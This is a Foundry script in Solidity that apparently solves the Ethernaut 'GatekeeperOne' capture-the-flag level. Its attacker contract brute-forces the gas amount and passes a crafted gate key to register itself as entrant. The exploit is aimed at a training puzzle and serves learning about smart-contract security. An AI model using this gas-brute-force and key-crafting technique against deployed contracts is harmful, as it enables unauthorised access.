// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console2} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/13_GatekeeperOne.sol";

contract Mallicious {
	function attack(address _target) external {
		GatekeeperOne target = GatekeeperOne(_target);
		bytes8 gateKey = 0x1000000000001Bf1;

		for (uint256 i; i < 8191; i++) {
			try target.enter{gas: 800000 + i}(gateKey) {
				console2.log("passed with gas ->", 800000 + i);
				break;
			} catch {}
		}
	}
}

contract Exploit is Script {
	function run() public {
		vm.startBroadcast();
		address target = vm.envAddress("INSTANCE");
		address myAddr = vm.envAddress("MY_ADDR");

		// deploy
		console2.log("My Address: ", myAddr);
		Mallicious attacker = new Mallicious();

		//attack
		attacker.attack(target);

		// verify
		GatekeeperOne gatekeeper = GatekeeperOne(target);
		require(myAddr == gatekeeper.entrant(), "Exploit failed");
		console2.log("Success! We managed to register ourselve as the entrant!");

		vm.stopBroadcast();
	}
}
